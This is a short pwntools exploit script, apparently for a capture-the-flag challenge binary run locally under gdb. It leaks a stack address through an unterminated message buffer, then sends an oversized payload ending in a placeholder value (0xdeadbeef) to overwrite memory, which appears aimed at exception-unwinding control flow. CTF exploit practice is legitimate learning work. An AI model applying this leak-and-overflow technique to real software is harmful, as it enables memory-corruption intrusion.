from pwn import *
elf = context.binary = ELF("./chall_patched")
context.log_level = "debug"

io = process()
gs = '''
b *main
break *0x000000000040162b
break *_Unwind_RaiseException+0x389'''


gdb.attach(io,gdbscript=gs)

io.sendline(str(1))
io.sendlineafter(b'Enter size: \n', str(0x20))
io.sendafter(b'Enter your message: \n', b'A' * 0x18)
io.recvn(0x18)

stack_leak = u64(io.recvline().strip().ljust(0x8, b'\x00'))

log.success(f"Stack leak: {hex(stack_leak)}")

io.sendline(str(1))
io.sendlineafter(b'Enter size: \n', str(0x10))
payload = b"A"*0x50+pack(0xdeadbeef)
io.sendafter(b'Enter your message: \n',payload )












io.interactive()